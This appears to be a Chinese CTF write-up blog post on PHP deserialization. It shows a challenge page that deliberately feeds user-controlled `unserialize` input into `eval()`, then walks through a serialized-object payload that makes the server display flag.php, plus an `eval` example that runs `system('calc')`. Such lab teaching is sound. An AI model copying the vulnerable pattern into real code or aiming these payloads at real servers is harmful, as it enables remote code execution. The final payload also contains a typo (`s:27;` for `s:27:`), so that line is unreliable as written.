---
title: CTF之PHP反序列化1
date: 2025-11-19 14:51:36
tags: 
    - CTF 
    - Web
    - 渗透测试
    - PHP
---

# PHP反序列化1

## 什么是序列化和反序列化

序列化是将对象转换成可存储的字节序列的过程

反序列化是将字节序列恢复为对象

当用户参数可控时，反序列化过程中会导致一些安全问题

## 题目

序列化迷城 1：失落的神器

铁柱是一位年轻的网络安全研究员，在整理已故教授的遗物时，他发现了一台古老的计算机和一段神秘的代码。这台计算机上运行着一个实验性的安全系统，教授曾用它来测试一种新的对象序列化技术。然而，系统中存在一个致命的漏洞，允许通过精心构造的序列化对象来执行任意代码。铁柱需要利用这个漏洞，激活系统中隐藏的"神器"程序，从而找到教授留下的第一个秘密。

## 解题步骤

打开页面看到

```php

<?php
highlight_file(__FILE__);
error_reporting(0);
class a{
    var $act;
    function action(){
        eval($this->act);
    }
}
$a=unserialize($_GET['flag']);
$a->action();
?> 
```

在本题中，使用了`eval()`函数，该函数会把字符串作为代码执行，比如：

```php
<?php
    $cmd = "system('calc')"
    eval($cmd)
?>
```

就可以打开计算器

题目中`highlight_file(__FILE__)`用于高亮显示代码文件，`error_reporting(0)`可以清空报错信息，因此我们可以构造payload：

```php
$a = new a();
$a->act="highlight_file('flag.php');";
echo serialize($a);
```

即构建为：

```php
O:1:"a":1:{s:3:"act";s:27;"highlight_file('flag.php');";}
```

`O`代表是一个Object，类名长度为`1`，类名为`"a"`，对象包含`1`个属性，接下来是在`{}`中设置属性`s:3:"act"`其中`s`代表字符串，长度为`3`，属性名`"act"`；`s:27:"highlight_file('flag.php');"`，类型字符串`s`，长度`27`字节（引号中的部分）

因此我们组合起来的意思就是：

构造一个类`a`的对象，这个对象有一个属性`act`，值为`"highlight_file('flag.php');"`

此时PHP执行的语句就是：

```php
eval("highlight_file('flag.php');")
```

从而得到flag